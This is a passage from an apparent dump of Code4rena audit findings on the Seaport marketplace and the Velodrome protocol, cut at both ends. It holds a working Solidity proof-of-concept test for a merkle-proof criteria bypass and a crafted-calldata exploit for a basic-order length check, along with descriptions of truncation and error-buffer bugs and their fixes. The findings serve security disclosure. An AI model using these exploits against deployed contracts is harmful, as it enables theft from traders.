There are no real verifications on the merkle proof that the supplied tokenId is indeed **a leaf of the merkle tree**. It's possible to submit an intermediate hash of the merkle tree as the tokenId and trade this NFT instead of one of the requested ones.  This leads to losses for the offerer as they receive a tokenId that they did not specify in the criteria. Usually, this criteria functionality is used to specify tokenIds with certain traits that are highly valuable. The offerer receives a low-value token that does not have these traits.  #### Example Alice wants to buy either NFT with tokenId 1 or tokenId 2. She creates a merkle tree of it and the root is `hash(1||2) = 0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0`. She creates an offer for this criteria. An attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.  > One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard. >  > \"While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'.\" [EIP721](https://eips.ethereum.org/EIPS/eip-721) > > Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions. > Therefore, ERC721-compliant token contracts are vulnerable to this attack.  #### POC Here's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.  ```solidity contract BugMerkleTree is BaseOrderTest {     struct Context {         ConsiderationInterface consideration;         bytes32 tokenCriteria;         uint256 paymentAmount;         address zone;         bytes32 zoneHash;         uint256 salt;     }      function hashHashes(bytes32 hash1, bytes32 hash2)         internal         returns (bytes32)     {         // see MerkleProof.verify         bytes memory encoding;         if (hash1 <= hash2) {             encoding = abi.encodePacked(hash1, hash2);         } else {             encoding = abi.encodePacked(hash2, hash1);         }         return keccak256(encoding);     }      function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {         // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree         bytes32 leafLeft = bytes32(uint256(1));         bytes32 leafRight = bytes32(uint256(2));         bytes32 merkleRoot = hashHashes(leafLeft, leafRight);         console.logBytes32(merkleRoot);          Context memory context = Context(             consideration,             merkleRoot, /* tokenCriteria */             1e18, /* paymentAmount */             address(0), /* zone */             bytes32(0), /* zoneHash */             uint256(0) /* salt */         );         bytes32 conduitKey = bytes32(0);          token1.mint(address(alice), context.paymentAmount);         // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable         // we acquire the merkle root ID         test721_1.mint(address(this), uint256(merkleRoot));          _configureERC20OfferItem(             // start, end             context.paymentAmount, context.paymentAmount         );         _configureConsiderationItem(             ItemType.ERC721_WITH_CRITERIA,             address(test721_1),             // @audit set merkle root for NFTs we want to accept             uint256(context.tokenCriteria), /* identifierOrCriteria */             1,             1,             alice         );          OrderParameters memory orderParameters = OrderParameters(             address(alice),             context.zone,             offerItems,             considerationItems,             OrderType.FULL_OPEN,             block.timestamp,             block.timestamp + 1000,             context.zoneHash,             context.salt,             conduitKey,             considerationItems.length         );          OrderComponents memory orderComponents = getOrderComponents(             orderParameters,             context.consideration.getNonce(alice)         );         bytes32 orderHash = context.consideration.getOrderHash(orderComponents);         bytes memory signature = signOrder(             context.consideration,             alicePk,             orderHash         );          delete offerItems;         delete considerationItems;          /*************** ATTACK STARTS HERE ***************/         AdvancedOrder memory advancedOrder = AdvancedOrder(             orderParameters,             1, /* numerator */             1, /* denominator */             signature,             \"\"         );          // resolve the merkle root token ID itself         CriteriaResolver[] memory cr = new CriteriaResolver[](1);         bytes32[] memory proof = new bytes32[](0);         cr[0] = CriteriaResolver(               0, // uint256 orderIndex;               Side.CONSIDERATION, // Side side;               0, // uint256 index; (item)               uint256(merkleRoot), // uint256 identifier;               proof // bytes32[] criteriaProof;         );          uint256 profit = token1.balanceOf(address(this));         context.consideration.fulfillAdvancedOrder{             value: context.paymentAmount         }(advancedOrder, cr, bytes32(0));         profit = token1.balanceOf(address(this)) - profit;          // @audit could fulfill order without owning NFT 1 or 2         assertEq(profit, context.paymentAmount);     } } ```  ## Recommended Mitigation Steps Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not. An elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.) Then compute the leaf hash in the contract from the provided tokenId:  ```diff function _verifyProof(     uint256 leaf,     uint256 root,     bytes32[] memory proof ) internal pure {     bool isValid;  -    assembly { -        let computedHash := leaf +  bytes32 computedHash = keccak256(abi.encodePacked(leaf))   ... ```  There can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.  Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)   "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/164", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/162", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/161", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/160", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/159", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/157", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/154", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/152", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/150", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/148", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/145", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/144", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/137", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "ERC721 Transfers aren't \"safe\"", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/135", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-opensea-seaport-findings", "body": "ERC721 Transfers aren't \"safe\""}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/134", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/131", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/130", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Wrong items length assertion in basic order", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/129", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349   # Vulnerability details  When fulfilling a basic order we need to assert that the parameter `totalOriginalAdditionalRecipients` is less or equal than the length of `additionalRecipients` written in calldata. However in `_prepareBasicFulfillmentFromCalldata` this assertion is incorrect [(L346)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349): ```js         // Ensure supplied consideration array length is not less than original.         _assertConsiderationLengthIsNotLessThanOriginalConsiderationLength(             parameters.additionalRecipients.length + 1,             parameters.totalOriginalAdditionalRecipients         ); ``` The way the function it's written ([L75](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83)), it accepts also a length smaller than the original by 1 (basically there shouldn't be a `+ 1` in the first argument).  Interestingly enough, in the case `additionalRecipients.length < totalOriginalAdditionalRecipients`, the inline-assembly for-loop at [(L506)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506) will read consideration items out-of-bounds. This can be a vector of exploits, as illustrated below.  ## Proof of Concept Alice makes the following offer: a basic order, with two `considerationItem`s. The second item has the following data: ```js consideration[1] = {  itemType: ...,  token: ...,  identifierOrCriteria: ...,  startAmount: X,  endAmount: X,  recipient: Y, } ``` The only quantities we need to track are the amounts `X` and recipient `Y`.  When fulfilling the order normally, the fulfiller will spend `X` tokens sending them to `Y`. It's possible however to exploit the previous bug in a way that the fulfiller won't need to make this transfer.  To do this, the fulfiller needs to craft the following calldata:  | calldata pointer |   correct calldata   |   exploit calldata  | |-----------------:|:--------------------:|:-------------------:| |              ... |          ...         |         ...         | |            0x204 |   1 (tot original)   |   1 (tot original)  | |            0x224 |  0x240 (head addRec) | 0x240 (head addRec) | |            0x244 |   0x2a0 (head sign)  |  0x260 (head sign)  | |            0x264 |   1 (length addRec)  |  0 (length addRec)  | |            0x284 |      X (amount)      |   X (length sign)   | |            0x2a4 |     Y (recipient)    |    Y (sign body)    | |            0x2c4 |  0x40 (length sign)  |   0x00 (sign body)  | |            0x2e4 | [correct Alice sign] |         ...         | |            0x304 | [correct Alice sign] |         ...         | |                  |                      |                     |  Basically writing `additionalRecipients = []` and making the signature length = `X`, with `Y` being the first 32 bytes. Of course this signature will be invalid; however it doesn't matter since the exploiter can call `validate` with the correct signature beforehand.  The transaction trace will look like this: - the assertion `_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength` passes; - the `orderHash` calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} [(L513)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550); - the order was already validated beforehand, so the signature isn't read; - at the end, during the tokens transfers, only `offer` and `consideration[0]` are transferred, since the code looks at `additionalRecipients` which is empty.  Conclusion:  Every Order that is \"basic\" and has two or more consideration items can be fulfilled in a way to not trade the _last_ consideration item in the list. The fulfiller spends less then normally, and a recipient doesn't get his due.  There's also an extra requirement which is stricter: this last item's `startAmount` (= endAmount) needs to be smallish (< 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.  I've made a hardhat test that exemplifies the exploit. [(Link to gist)](https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4).  ## Recommended Mitigation Steps Remove the `+1` at L347.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/128", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/123", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/113", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/112", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/110", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/109", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/106", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/104", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/103", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/100", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/98", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/90", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/86", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/85", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/83", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/79", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Truncation in `OrderValidator` can lead to resetting the fill and selling more tokens", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/77", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238   # Vulnerability details  ## Impact  A partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:  1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`. 2. Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH. 3. Malory tries to fill the order in the following way:     1. Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.     2. Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by \"cross multiplying\" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.     3. Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.     4. Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!   ## Proof of Concept   For a full POC: https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409  The following change would make the above POC fail: ```diff modified   contracts/lib/OrderValidator.sol @@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {                  // Update order status and fill amount, packing struct values.                  _orderStatus[orderHash].isValidated = true;                  _orderStatus[orderHash].isCancelled = false; +                require(filledNumerator + numerator <= type(uint120).max, \"overflow\"); +                require(denominator <= type(uint120).max, \"overflow\");                  _orderStatus[orderHash].numerator = uint120(                      filledNumerator + numerator                  ); @@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {              // Update order status and fill amount, packing struct values.              _orderStatus[orderHash].isValidated = true;              _orderStatus[orderHash].isCancelled = false; +            require(numerator <= type(uint120).max, \"overflow\"); +            require(denominator <= type(uint120).max, \"overflow\");              _orderStatus[orderHash].numerator = uint120(numerator);              _orderStatus[orderHash].denominator = uint120(denominator);          } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and require more changes to fully fix it. See a related issue: \"A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone\" that points out a related but a more fundamental issue with the mechanism.   "}, {"title": "`_aggregateValidFulfillmentOfferItems()` can be tricked to accept invalid inputs", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/75", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406   # Vulnerability details  ## Impact   The `_aggregateValidFulfillmentOfferItems()` function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable `errorBuffer`, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.  Note: there is a similar issue in `_aggregateValidFulfillmentConsiderationItems()` , which is reported separately.  The problem lies in how this `errorBuffer` is updated: ```solidity                 // Update error buffer (1 = zero amount, 2 = overflow).                 errorBuffer := or(                   errorBuffer,                   or(                     shl(1, lt(newAmount, amount)),                     iszero(mload(amountPtr))                   )                 ) ```  The final error handling code: ```solidity             // Determine if an error code is contained in the error buffer.             switch errorBuffer             case 1 {                 // Store the MissingItemAmount error signature.                 mstore(0, MissingItemAmount_error_signature)                  // Return, supplying MissingItemAmount signature.                 revert(0, MissingItemAmount_error_len)             }             case 2 {                 // If the sum overflowed, panic.                 throwOverflow()             } ```  While the expected value is `0` (success),  `1` or `2` (failure), it is possible to set it to `3`, which is unhandled and considered as a \"success\". This can be easily accomplished by having both an overflowing item and a zero item in the order list.  This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.  ## Proof of Concept  Craft an offer containing two errors (e.g. with  zero amount and overflow). Call `matchOrders()`. Via calls to `_matchAdvancedOrders()`, `_fulfillAdvancedOrders()`, `_applyFulfillment()`, `_aggregateValidFulfillmentOfferItems()` will be called. The `errorBuffer` will get a value of 3  (the `or` of 1 and 2). As the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  1. Change the check on [FulfillmentApplier.sol#L465](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465)  to consider `case 3`. 2. Potential option: Introduce an early abort in case `errorBuffer != 0` on [FulfillmentApplier.sol#L338](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338)  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/74", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/71", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/70", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/65", "labels": ["bug", "duplicate", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/64", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/63", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/60", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/57", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/53", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/52", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/42", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/41", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/28", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/23", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/21", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-opensea-seaport-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/20", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/17", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-opensea-seaport-findings/issues/4", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-opensea-seaport-findings", "body": "Gas Optimizations"}, {"title": "Agreement & Disclosures", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/228", "labels": [], "target": "2022-05-velodrome-findings", "body": "Agreement & Disclosures"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/224", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/223", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Bribe.sol is not meant to handle fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/222", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Bribe.sol is not meant to handle fee-on-transfer tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/218", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/217", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/216", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/215", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/214", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/213", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/212", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/211", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/210", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/209", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-05-velodrome-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/208", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/207", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-05-velodrome-findings", "body": "QA Report"}, {"title": "Voting overwrites checkpoint.voted in last checkpoint, so users can just vote right before claiming rewards", "html_url": "https://github.com/code-423n4/2022-05-velodrome-findings/issues/206", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged"], "target": "2022-05-velodrome-findings", "body": "Voting overwrites checkpoint.voted in last checkpoint, so users can just vote right before claiming rewards"}, {"title": "Gas Optimizations", "html_url": 